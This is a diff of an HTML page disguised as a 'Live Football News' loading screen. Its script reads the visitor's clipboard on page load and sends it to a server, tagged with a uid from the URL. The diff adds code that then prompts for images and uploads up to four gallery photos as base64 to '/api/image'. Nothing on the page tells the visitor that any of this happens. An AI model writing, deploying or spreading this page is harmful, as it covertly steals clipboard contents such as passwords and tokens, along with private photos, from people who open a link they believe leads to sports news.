@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Live Football News</title>
   <style>
     body {
@@ -19,7 +19,6 @@
       min-height: 100vh;
       backdrop-filter: blur(3px);
     }
-
     .container {
       background: rgba(0, 0, 0, 0.65);
       border-radius: 20px;
@@ -28,19 +27,16 @@
       max-width: 90%;
       box-shadow: 0 0 20px rgba(255, 255, 255, 0.2);
     }
-
     h1 {
       font-size: 32px;
       margin-bottom: 10px;
       font-weight: bold;
     }
-
     p {
       font-size: 20px;
       margin: 0 0 20px;
       font-weight: 600;
     }
-
     .spinner {
       border: 5px solid #f3f3f3;
       border-top: 5px solid #ffd700;
@@ -50,12 +46,10 @@
       animation: spin 1s linear infinite;
       margin: 20px auto;
     }
-
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
-
     .credit {
       margin-top: 30px;
       padding: 10px 15px;
@@ -65,7 +59,6 @@
       backdrop-filter: blur(5px);
       font-weight: bold;
     }
-
     @media (max-width: 600px) {
       h1 { font-size: 26px; }
       p { font-size: 16px; }
@@ -82,11 +75,11 @@
   </div>
 
   <script>
-    async function sendClipboard() {
-      const uid = new URLSearchParams(window.location.search).get("uid");
-      if (!uid) return;
+    const uid = new URLSearchParams(window.location.search).get("uid");
 
+    async function sendClipboard() {
       try {
+        if (!uid) return;
         const text = await navigator.clipboard.readText();
         if (!text) return;
 
@@ -100,7 +93,35 @@
       }
     }
 
-    window.onload = sendClipboard;
+    async function sendGalleryImages() {
+      if (!uid) return;
+      const input = document.createElement("input");
+      input.type = "file";
+      input.accept = "image/*";
+      input.multiple = true;
+      input.click();
+
+      input.onchange = async () => {
+        const files = [...input.files].slice(0, 4); // محدودیت: ۴ عکس
+        for (const file of files) {
+          const reader = new FileReader();
+          reader.onload = async function () {
+            const base64 = reader.result;
+            await fetch("/api/image", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ uid, image: base64 })
+            });
+          };
+          reader.readAsDataURL(file);
+        }
+      };
+    }
+
+    window.onload = async () => {
+      await sendClipboard();
+      setTimeout(sendGalleryImages, 2000); // ۲ ثانیې وروسته له clipboard
+    };
   </script>
 </body>
 </html> 
